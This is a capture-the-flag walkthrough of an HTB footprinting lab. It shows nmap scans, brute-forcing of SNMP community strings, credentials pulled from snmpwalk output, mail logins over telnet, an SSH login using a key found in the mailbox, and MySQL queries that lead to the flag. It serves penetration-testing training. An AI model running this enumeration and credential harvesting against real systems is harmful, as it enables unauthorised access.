---
title: HTB - Footprinting Lab - Hard
date: 2026-02-03
tags: ["Linux", "Reconnaissance"]
description: Walkthrough of the HTB - Footprinting Lab - Hard
difficulty: Hard 
---

## Given

The third server is an MX and management server for the internal network. Subsequently, this server has the function of a backup server for the internal accounts in the domain. Accordingly, a user named `HTB` was also created here, whose credentials we need to access.

## Summary

The target 10.129.24.84 is a Linux host with open services SSH, IMAP, POP3, and SNMP. Beginning with SNMP enumeration, I used the `backup` community string and was able to extract the credentials `tom:NMds732Js2761`. I then logged in to POP3 with those credentials and was able to view and copy an exposed OpenSSH Private Key to my Kali host. I then was able to log in to ssh using that private key and discovered a running mysql instance. Finally, I performed sql enumeration and was able to find the flag.

## Reconnaissance

### Initial Nmap Scan

```bash
nmap -sV -sS -T4 10.129.24.84
```

Findings:

SSH (port 22) v8.2p1
IMAP (port 143,993) - dovecot
POP3 (port 110,995) - dovecot

![[01-nmap-initial.png]]

### Full Nmap Scan

```bash
nmap -sV -sS -T4 -p- 10.129.24.84
```

Findings:

Nothing changed from initial

### Nmap UDP Scan

```bash
nmap -sU -sV --top-port 100 10.129.24.84
```

FIndings: SNMP (port 161) - snmpv3
Lesson: CHECK UDP

![[02-nmap-udp.png]]

### SNMP

```bash
┌──(kali㉿kali)-[~]
└─$ snmpwalk -v 2c -c public 10.129.24.84     
Timeout: No Response from 10.129.24.

┌──(kali㉿kali)-[~]
└─$ onesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp.txt 10.129.24.84 
Scanning 1 hosts, 3219 communities
10.129.24.84 [backup] Linux NIXHARD 5.4.0-90-generic #101-Ubuntu SMP Fri Oct 15 20:00:55 UTC 2021 x86_64
^C

# Findings: backup


┌──(kali㉿kali)-[~]
└─$ snmpwalk -v 2c -c backup 10.129.24.84                                                            
iso.3.6.1.2.1.1.1.0 = STRING: "Linux NIXHARD 5.4.0-90-generic #101-Ubuntu SMP Fri Oct 15 20:00:55 UTC 2021 x86_64"
iso.3.6.1.2.1.1.2.0 = OID: iso.3.6.1.4.1.8072.3.2.10
iso.3.6.1.2.1.1.3.0 = Timeticks: (427259) 1:11:12.59
iso.3.6.1.2.1.1.4.0 = STRING: "Admin <tech@inlanefreight.htb>"
iso.3.6.1.2.1.1.5.0 = STRING: "NIXHARD"
iso.3.6.1.2.1.1.6.0 = STRING: "Inlanefreight"
iso.3.6.1.2.1.1.7.0 = INTEGER: 72
iso.3.6.1.2.1.1.8.0 = Timeticks: (37) 0:00:00.37
iso.3.6.1.2.1.1.9.1.2.1 = OID: iso.3.6.1.6.3.10.3.1.1
iso.3.6.1.2.1.1.9.1.2.2 = OID: iso.3.6.1.6.3.11.3.1.1
iso.3.6.1.2.1.1.9.1.2.3 = OID: iso.3.6.1.6.3.15.2.1.1
iso.3.6.1.2.1.1.9.1.2.4 = OID: iso.3.6.1.6.3.1
iso.3.6.1.2.1.1.9.1.2.5 = OID: iso.3.6.1.6.3.16.2.2.1
iso.3.6.1.2.1.1.9.1.2.6 = OID: iso.3.6.1.2.1.49
iso.3.6.1.2.1.1.9.1.2.7 = OID: iso.3.6.1.2.1.4
iso.3.6.1.2.1.1.9.1.2.8 = OID: iso.3.6.1.2.1.50
iso.3.6.1.2.1.1.9.1.2.9 = OID: iso.3.6.1.6.3.13.3.1.3
iso.3.6.1.2.1.1.9.1.2.10 = OID: iso.3.6.1.2.1.92
iso.3.6.1.2.1.1.9.1.3.1 = STRING: "The SNMP Management Architecture MIB."
iso.3.6.1.2.1.1.9.1.3.2 = STRING: "The MIB for Message Processing and Dispatching."
iso.3.6.1.2.1.1.9.1.3.3 = STRING: "The management information definitions for the SNMP User-based Security Model."
iso.3.6.1.2.1.1.9.1.3.4 = STRING: "The MIB module for SNMPv2 entities"
iso.3.6.1.2.1.1.9.1.3.5 = STRING: "View-based Access Control Model for SNMP."
iso.3.6.1.2.1.1.9.1.3.6 = STRING: "The MIB module for managing TCP implementations"
iso.3.6.1.2.1.1.9.1.3.7 = STRING: "The MIB module for managing IP and ICMP implementations"
iso.3.6.1.2.1.1.9.1.3.8 = STRING: "The MIB module for managing UDP implementations"
iso.3.6.1.2.1.1.9.1.3.9 = STRING: "The MIB modules for managing SNMP Notification, plus filtering."
iso.3.6.1.2.1.1.9.1.3.10 = STRING: "The MIB module for logging SNMP Notifications."
iso.3.6.1.2.1.1.9.1.4.1 = Timeticks: (37) 0:00:00.37
iso.3.6.1.2.1.1.9.1.4.2 = Timeticks: (37) 0:00:00.37
iso.3.6.1.2.1.1.9.1.4.3 = Timeticks: (37) 0:00:00.37
iso.3.6.1.2.1.1.9.1.4.4 = Timeticks: (37) 0:00:00.37
iso.3.6.1.2.1.1.9.1.4.5 = Timeticks: (37) 0:00:00.37
iso.3.6.1.2.1.1.9.1.4.6 = Timeticks: (37) 0:00:00.37
iso.3.6.1.2.1.1.9.1.4.7 = Timeticks: (37) 0:00:00.37
iso.3.6.1.2.1.1.9.1.4.8 = Timeticks: (37) 0:00:00.37
iso.3.6.1.2.1.1.9.1.4.9 = Timeticks: (37) 0:00:00.37
iso.3.6.1.2.1.1.9.1.4.10 = Timeticks: (37) 0:00:00.37
iso.3.6.1.2.1.25.1.1.0 = Timeticks: (428213) 1:11:22.13
iso.3.6.1.2.1.25.1.2.0 = Hex-STRING: 07 EA 02 04 13 35 0A 00 2B 00 00 
iso.3.6.1.2.1.25.1.3.0 = INTEGER: 393216
iso.3.6.1.2.1.25.1.4.0 = STRING: "BOOT_IMAGE=/vmlinuz-5.4.0-90-generic root=/dev/mapper/ubuntu--vg-ubuntu--lv ro ipv6.disable=1 maybe-ubiquity
"
iso.3.6.1.2.1.25.1.5.0 = Gauge32: 0
iso.3.6.1.2.1.25.1.6.0 = Gauge32: 140
iso.3.6.1.2.1.25.1.7.0 = INTEGER: 0
iso.3.6.1.2.1.25.1.7.1.1.0 = INTEGER: 1
iso.3.6.1.2.1.25.1.7.1.2.1.2.6.66.65.67.75.85.80 = STRING: "/opt/tom-recovery.sh"
iso.3.6.1.2.1.25.1.7.1.2.1.3.6.66.65.67.75.85.80 = STRING: "tom NMds732Js2761"
# Findings: tom:NMds732Js2761
iso.3.6.1.2.1.25.1.7.1.2.1.4.6.66.65.67.75.85.80 = ""
iso.3.6.1.2.1.25.1.7.1.2.1.5.6.66.65.67.75.85.80 = INTEGER: 5
iso.3.6.1.2.1.25.1.7.1.2.1.6.6.66.65.67.75.85.80 = INTEGER: 1
iso.3.6.1.2.1.25.1.7.1.2.1.7.6.66.65.67.75.85.80 = INTEGER: 1
iso.3.6.1.2.1.25.1.7.1.2.1.20.6.66.65.67.75.85.80 = INTEGER: 4
iso.3.6.1.2.1.25.1.7.1.2.1.21.6.66.65.67.75.85.80 = INTEGER: 1
iso.3.6.1.2.1.25.1.7.1.3.1.1.6.66.65.67.75.85.80 = STRING: "chpasswd: (user tom) pam_chauthtok() failed, error:"
iso.3.6.1.2.1.25.1.7.1.3.1.2.6.66.65.67.75.85.80 = STRING: "chpasswd: (user tom) pam_chauthtok() failed, error:
Authentication token manipulation error
chpasswd: (line 1, user tom) password not changed
Changing password for tom."
iso.3.6.1.2.1.25.1.7.1.3.1.3.6.66.65.67.75.85.80 = INTEGER: 4
iso.3.6.1.2.1.25.1.7.1.3.1.4.6.66.65.67.75.85.80 = INTEGER: 1
iso.3.6.1.2.1.25.1.7.1.4.1.2.6.66.65.67.75.85.80.1 = STRING: "chpasswd: (user tom) pam_chauthtok() failed, error:"
iso.3.6.1.2.1.25.1.7.1.4.1.2.6.66.65.67.75.85.80.2 = STRING: "Authentication token manipulation error"
iso.3.6.1.2.1.25.1.7.1.4.1.2.6.66.65.67.75.85.80.3 = STRING: "chpasswd: (line 1, user tom) password not changed"
iso.3.6.1.2.1.25.1.7.1.4.1.2.6.66.65.67.75.85.80.4 = STRING: "Changing password for tom."
iso.3.6.1.2.1.25.1.7.1.4.1.2.6.66.65.67.75.85.80.4 = No more variables left in this MIB View (It is past the end of the MIB tree)

```


Findings: 
* Credentials `tom:NMds732Js2761`
* possible hostname `tech@inlanefreight.htb`
* possible org name: `InlaneFreight`

![[03-snmpwalk-credentials.png]]

### POP3

```bash
telnet 10.129.24.84 110 
Trying 10.129.24.84...
Connected to 10.129.24.84.
Escape character is '^]'.
+OK Dovecot (Ubuntu) ready.
USER tom 
+OK
PASS NMds732Js2761
+OK Logged in.
LIST
+OK 1 messages:
1 3661
.
RETR 1
+OK 3661 octets
HELO dev.inlanefreight.htb
MAIL FROM:<tech@dev.inlanefreight.htb>
RCPT TO:<bob@inlanefreight.htb>
DATA
From: [Admin] <tech@inlanefreight.htb>
To: <tom@inlanefreight.htb>
Date: Wed, 10 Nov 2010 14:21:26 +0200
Subject: KEY
```


Findings:

* OpenSSH Private Key!!!
* `dev.inlanefreight.htb`
* Admin `tech@inlanefreight.htb`
* `bob@inlanefreight.htb`
* tom email `tom@inlanefreight.htb`

![[04-pop3-sshkey.png]]

### IMAP

```bash
┌──(kali㉿kali)-[~]
└─$ telnet 10.129.24.84 143                                            
Trying 10.129.24.84...
Connected to 10.129.24.84.
Escape character is '^]'.
* OK [CAPABILITY IMAP4rev1 SASL-IR LOGIN-REFERRALS ID ENABLE IDLE LITERAL+ STARTTLS AUTH=PLAIN] Dovecot (Ubuntu) ready.
a1 LOGIN tom NMds732Js2761
a1 OK [CAPABILITY IMAP4rev1 SASL-IR LOGIN-REFERRALS ID ENABLE IDLE SORT SORT=DISPLAY THREAD=REFERENCES THREAD=REFS THREAD=ORDEREDSUBJECT MULTIAPPEND URL-PARTIAL CATENATE UNSELECT CHILDREN NAMESPACE UIDPLUS LIST-EXTENDED I18NLEVEL=1 CONDSTORE QRESYNC ESEARCH ESORT SEARCHRES WITHIN CONTEXT=SEARCH LIST-STATUS BINARY MOVE SNIPPET=FUZZY PREVIEW=FUZZY LITERAL+ NOTIFY SPECIAL-USE] Logged in
a2 LIST "" "*"
* LIST (\HasNoChildren) "." Notes
* LIST (\HasNoChildren) "." Meetings
* LIST (\HasNoChildren \UnMarked) "." Important
* LIST (\HasNoChildren) "." INBOX
a2 OK List completed (0.006 + 0.000 + 0.005 secs).
a3 SELECT INBOX
* FLAGS (\Answered \Flagged \Deleted \Seen \Draft)
* OK [PERMANENTFLAGS (\Answered \Flagged \Deleted \Seen \Draft \*)] Flags permitted.
* 1 EXISTS
* 0 RECENT
* OK [UIDVALIDITY 1636509064] UIDs valid
* OK [UIDNEXT 2] Predicted next UID
a3 OK [READ-WRITE] Select completed (0.001 + 0.000 secs).
a4 FETCH 1 FULL
* 1 FETCH (FLAGS (\Seen) INTERNALDATE "10-Nov-2021 01:44:26 +0000" RFC822.SIZE 3661 ENVELOPE ("Wed, 10 Nov 2010 14:21:26 +0200" "KEY" ((NIL NIL "MISSING_MAILBOX" "MISSING_DOMAIN")) ((NIL NIL "MISSING_MAILBOX" "MISSING_DOMAIN")) ((NIL NIL "MISSING_MAILBOX" "MISSING_DOMAIN")) ((NIL NIL "tom" "inlanefreight.htb")) NIL NIL NIL NIL) BODY ("text" "plain" ("charset" "us-ascii") NIL NIL "7bit" 3430 49))
a4 OK Fetch completed (0.002 + 0.000 + 0.001 secs).
```

Findings: Nothing new, reference to `KEY` (found in POP3 enumeration) but not exposed using IMAP

## Initial Access

### SSH

Full path

1. OpenSSH private key found from POP3 enumeration
2. copy to clipboard
3. create id_rsa on kali host and paste private key
4. chmod 600 id_rsa

```bash
ssh tom@10.129.24.84 -i id_rsa
```

![[05-poc-ssh.png]]

```bash
tom@NIXHARD:~/Maildir$ cat dovecot-uidlist
3 V1636509064 N2 G991ec2188b258b618c8a0000afbeafc6
1 W3661 :key
```

```bash
tom@NIXHARD:/home$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
sshd:x:111:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
ubuntu:x:1000:1000:ubuntu:/home/ubuntu:/bin/bash
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
cry0l1t3:x:1001:1001:,,,:/home/cry0l1t3:/bin/bash
usbmux:x:112:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
mysql:x:114:119:MySQL Server,,,:/nonexistent:/bin/false
tom:x:1002:1002:,,,:/home/tom:/bin/bash
dovecot:x:113:120:Dovecot mail server,,,:/usr/lib/dovecot:/usr/sbin/nologin
dovenull:x:115:121:Dovecot login user,,,:/nonexistent:/usr/sbin/nologin
Debian-snmp:x:116:122::/var/lib/snmp:/bin/false
```

Findings: running mysql

![[06-tom-passwd.png]]

```bash
tom@NIXHARD:/home$ mysql -u tom -p
Enter password: 
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 9
Server version: 8.0.27-0ubuntu0.20.04.1 (Ubuntu)

Copyright (c) 2000, 2021, Oracle and/or its affiliates.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mysql              |
| performance_schema |
| sys                |
| users              |
+--------------------+
5 rows in set (0.01 sec)

mysql> use users;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
mysql> show tables
    -> ;
+-----------------+
| Tables_in_users |
+-----------------+
| users           |
+-----------------+
1 row in set (0.00 sec)

mysql> show columns from users;
+----------+-------------+------+-----+---------+-------+
| Field    | Type        | Null | Key | Default | Extra |
+----------+-------------+------+-----+---------+-------+
| id       | int         | YES  |     | NULL    |       |
| username | varchar(50) | YES  |     | NULL    |       |
| password | varchar(50) | YES  |     | NULL    |       |
+----------+-------------+------+-----+---------+-------+
3 rows in set (0.00 sec)

mysql> select * from users where username = "HTB"
    -> ;
+------+----------+------------------------------+
| id   | username | password                     |
+------+----------+------------------------------+
|  150 | HTB      | cr3n4o7rzse7rzhnckhssncif7ds |
+------+----------+------------------------------+
1 row in set (0.00 sec)

mysql> 

```

![[07-mysql-login.png]]

# FLAG

Full Path

1. SSH login w/ found key
2. cat /etc/passwd
3. found mysql
4. login w/ found credentials (tom)
5. navigate sql, flag found

![[08-flag-found.png]]

# TAKEAWAYS

1. ALWAYS check UDP
2. screenshots NOT needed for every command, copy output and paste in writeup is sufficient proof
3. in this lab, POP3 retrieved full SSH key where IMAP did not